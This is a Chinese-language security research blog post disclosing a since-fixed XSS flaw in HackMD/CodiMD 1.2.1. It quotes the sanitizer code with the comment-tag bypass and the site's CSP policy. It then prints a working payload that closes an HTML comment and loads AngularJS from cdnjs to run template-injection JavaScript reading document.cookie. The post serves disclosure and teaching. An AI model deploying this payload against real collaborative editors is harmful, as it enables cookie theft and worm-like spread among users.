---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2019-03-a-wormable-xss-on-hackmd/
title: "A Wormable XSS on HackMD! | Orange Tsai"
author: "Orange Tsai"
published: 2019-03-11T16:00:00.000Z
description: "在 Web Security 中，我喜歡伺服器端的漏洞更勝於客戶端的漏洞!(當然可以直接拿 shell 的客戶端洞不在此限XD) 因為可以直接控制別人的伺服器對我來說更有趣! 正因如此，我以往的文章對於 XSS 及 CSRF 等相關弱點也較少著墨(仔細翻一下也只有 2018 年 Google CTF 那篇XD)，剛好這次的漏洞小小有趣，秉持著教育及炫耀(?)的心態就來發個文了XD 最近需要自架"
---

* * *

在 Web Security 中，我喜歡伺服器端的漏洞更勝於客戶端的漏洞!(當然可以直接拿 shell 的客戶端洞不在此限XD) 因為可以直接控制別人的伺服器對我來說更有趣! 正因如此，我以往的文章對於 XSS 及 CSRF 等相關弱點也較少著墨(仔細翻一下也只有 2018 年 Google CTF 那篇XD)，剛好這次的漏洞小小有趣，秉持著教育 ~~及炫耀(?)~~ 的心態就來發個文了XD

最近需要自架共筆伺服器，調查了一些市面上支援 Markdown 的共筆平台，最後還是選擇了國產的 [HackMD](https://hackmd.io/)! 當然，對於自己要使用的軟體都會習慣性的檢視一下安全性，否則怎麼敢放心使用? 因此花了約半天對 HackMD 進行了一次原始碼檢測(Code Review)!

[HackMD](https://hackmd.io/) 是一款由台灣人自行研發的線上 Markdown 共筆系統，除了在台灣資訊圈流行外，也被許多台灣研討會如 COSCUP, g0v 或 HITCON 等當成官方的共筆存放地點，甚至還是 [Ethereum](https://www.ethereum.org/) 的協作平台! 除了雲端使用及企業方案外，整份原始碼也很佛心的開放出來在 [GitHub](https://github.com/hackmdio/codimd) 上(4500 多顆星! 最近也才知道原來 HackMD 在中國及歐洲也有許多死忠用戶!)，算是很回饋台灣資訊社群的一個廠商!

平心而論，HackMD 整體程式碼品質不低，所以並沒有甚麼太嚴重的弱點，不過你也知道 XSS 不是那種想防就防得了的問題，綜觀 HackMD 歷年來關於 [安全相關的問題](https://github.com/hackmdio/codimd/issues?utf8=%E2%9C%93&q=XSS)，發現都是一些老手法如 `javascript:alert(1)` 或 `onclick` , `onload` 等，所以相較之下這個漏洞算是比較有趣的一個 XSS，視攻擊方式甚至可以達到像是 [Samy Worm](https://en.wikipedia.org/wiki/Samy_(computer_worm)) 等 [XSS 蠕蟲](https://en.wikipedia.org/wiki/XSS_worm) 的感染效果!

_P.S. 其實本來沒有要找 XSS 的，但看到寫法就覺得一定有問題，跳下去看後漏洞就自己跑出來了 ╮(╯\_╰)╭_

# [漏洞成因](https://blog.orange.tw/posts/2019-03-a-wormable-xss-on-hackmd/\#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0 "漏洞成因") 漏洞成因

(以下皆以 [CodiMD 版本 1.2.1](https://github.com/hackmdio/codimd/tree/1.2.1) 來進行解說)

最初是看到 HackMD 在前端渲染 Markdown 時的 XSS 防禦所引起我的興趣，由於 HackMD 允許嵌入客製化的網頁標籤，為了防止 XSS 的問題勢必得對 HTML 進行過濾，這裡 HackMD 使用了一個 XSS 防禦函示庫 - [npm/xss](https://jsxss.com/) 來防禦! 從相關的文檔及 GitHub 上的 Issue 及星星數觀察看起來是一個很成熟的 XSS 防禦函示庫，找到問題的話也是 0day 等級，不過只是隨手看看而已沒必要還幫幫第三方函示庫找 0day 吧?

因此把焦點放到函示庫的使用上，再安全的函示庫碰到不安全的用法也會無用武之地，這也是為什麼要找 [專業駭客](http://devco.re/) 的緣故!(置入性行銷XD) 整個 HackMD 使用到 npm/xss 的位置位於 [public/js/render.js](https://github.com/hackmdio/codimd/blob/1.2.1/public/js/render.js) 的 `preventXSS` 中，第一眼看到這段程式碼就直覺一定會有問題!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>``` | ```<br>var filterXSSOptions = {<br>  allowCommentTag: true,<br>  whiteList: whiteList,<br>  escapeHtml: function (html) {<br>    // allow html comment in multiple lines<br>    return html.replace(/<(?!!--)/g, '&lt;').replace(/-->/g, '-->').replace(/>/g, '&gt;').replace(/-->/g, '-->')<br>  },<br>  onIgnoreTag: function (tag, html, options) {<br>    // allow comment tag<br>    if (tag === '!--') {<br>            // do not filter its attributes<br>      return html<br>    }<br>  },<br>  onTagAttr: function (tag, name, value, isWhiteAttr) {<br>    // allow href and src that match linkRegex<br>    if (isWhiteAttr && (name === 'href' || name === 'src') && linkRegex.test(value)) {<br>      return name + '="' + filterXSS.escapeAttrValue(value) + '"'<br>    }<br>    // allow data uri in img src<br>    if (isWhiteAttr && (tag === 'img' && name === 'src') && dataUriRegex.test(value)) {<br>      return name + '="' + filterXSS.escapeAttrValue(value) + '"'<br>    }<br>  },<br>  onIgnoreTagAttr: function (tag, name, value, isWhiteAttr) {<br>    // allow attr start with 'data-' or in the whiteListAttr<br>    if (name.substr(0, 5) === 'data-' || window.whiteListAttr.indexOf(name) !== -1) {<br>      // escape its value using built-in escapeAttrValue function<br>      return name + '="' + filterXSS.escapeAttrValue(value) + '"'<br>    }<br>  }<br>}<br>function preventXSS (html) {<br>  return filterXSS(html, filterXSSOptions)<br>}<br>``` |

為了提供開發者可以自由的客製化過濾的處理，npm/xss 提供了多個不同的選項給開發者，而其中在 `onIgnoreTag` 這個 callback 中，開發者判斷了如果是註解的標籤便直接回傳原始的 HTML 內容，在 JavaScript 上的註解也寫得很直白!

> do not filter its attributes

可以想像開發者原本的用意應該是希望保留註解原本的內容! 既然它這麼相信註解中的內容，那我們來看一下是否可以從註解標籤中去汙染 DOM 的渲染! 我們構造如下的 HTML 內容:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br><!-- foo="bar--> <s>Hi</s>" --><br>``` |

把 `bar--> ...` 當成一個屬性的值，並在這個值中使用 `-->` 去閉合前方的註解標籤，如此一來便輕鬆地繞過只允許信任的 HTML 標籤及屬性，去插入惡意的 HTML 代碼!

# [繞過 CSP 政策](https://blog.orange.tw/posts/2019-03-a-wormable-xss-on-hackmd/\#%E7%B9%9E%E9%81%8E-CSP-%E6%94%BF%E7%AD%96 "繞過 CSP 政策") 繞過 CSP 政策

到這裡，你可能以為已經結束了，閉合前方的 `<!--` 標籤後再插入 `script` 標籤去執行任意 JavaScript 代碼! 但事情不是憨人想的那麼簡單，為了防止未知的 XSS 攻擊，HackMD 使用了 [CSP(Content Security Policy)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 去阻擋未授權的 JavaScript 代碼執行! 相關的 CSP 政策如下:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>content-security-policy: script-src 'self' vimeo.com https://gist.github.com www.slideshare.net https://query.yahooapis.com 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.mathjax.org https://www.google.com https://apis.google.com https://docs.google.com https://www.dropbox.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com https://stats.g.doubleclick.net https://secure.quantserve.com https://rules.quantcount.com https://pixel.quantserve.com https://js.driftt.com https://embed.small.chat https://static.small.chat https://www.googletagmanager.com https://cdn.ravenjs.com 'nonce-38703614-d766-4dff-954b-57372aafe8bd' 'sha256-EtvSSxRwce5cLeFBZbvZvDrTiRoyoXbWWwvEVciM5Ag=' 'sha256-NZb7w9GYJNUrMEidK01d3/DEtYztrtnXC/dQw7agdY4=' 'sha256-L0TsyAQLAc0koby5DCbFAwFfRs9ZxesA+4xg0QDSrdI='; img-src * data:; style-src 'self' 'unsafe-inline' https://assets-cdn.github.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com https://static.small.chat; font-src 'self' data: https://public.slidesharecdn.com https://cdnjs.cloudflare.com https://fonts.gstatic.com https://*.disquscdn.com; object-src *; media-src *; frame-src *; child-src *; connect-src *; base-uri 'none'; form-action 'self' https://www.paypal.com; upgrade-insecure-requests<br>``` |

仔細分析這個 CSP 政策，看到 `unsafe-eval` 這個關鍵字，第一個想到的是在 2017 年 Black Hat USA 由幾個 Google Security 成員所發表的 [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf) 手法! 不過其實不用這麼麻煩，CSP 政策還允許了 `https://cdnjs.cloudflare.com/` 這個 JavaScript hosting 服務，上方提供了許多第三方函示庫以供引入! 由於這個 CDN 提供商，繞過 CSP 就變成很簡單的一件事情了! 我們可以直接使用 AngularJS 函示庫，配合 [Client-Side Template Injection](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs) 的方式輕鬆繞過!

_P.S. 如果你對於 CSP 的政策不甚熟悉但還是想檢查自己的網站是否設置正確的話，可以使用 Google 所提供的 [CSP Evaluator](https://csp-evaluator.withgoogle.com/) 來檢測!_

# [最終攻擊代碼](https://blog.orange.tw/posts/2019-03-a-wormable-xss-on-hackmd/\#%E6%9C%80%E7%B5%82%E6%94%BB%E6%93%8A%E4%BB%A3%E7%A2%BC "最終攻擊代碼") 最終攻擊代碼

透過註解標籤屬性的跳脫及 CSP 的繞過，最後組出來的攻擊代碼如下:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```<br><!-- foo="--><br><script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js><br></script><br><div ng-app><br>    {{constructor.constructor('alert(document.cookie)')()}}<br></div><br>//sssss" --><br>``` |

這裡也展示了當與駭客同時編輯一份共筆時，對當前線上文件的所有人發動攻擊:

A Wormable XSS on HackMD - YouTube

Tap to unmute

[A Wormable XSS on HackMD](https://www.youtube.com/watch?v=GRi2pz6_sGY) [Orange Tsai](https://www.youtube.com/channel/UCnweRFxfA-xpTbkb83yfBog)

Orange Tsai3.75K subscribers

[Watch on](https://www.youtube.com/watch?v=GRi2pz6_sGY)

_P.S. 這個漏洞已經在最新版 CodiMD 中修復了，詳情可以參考 [pull request](https://github.com/hackmdio/codimd/pull/1112)_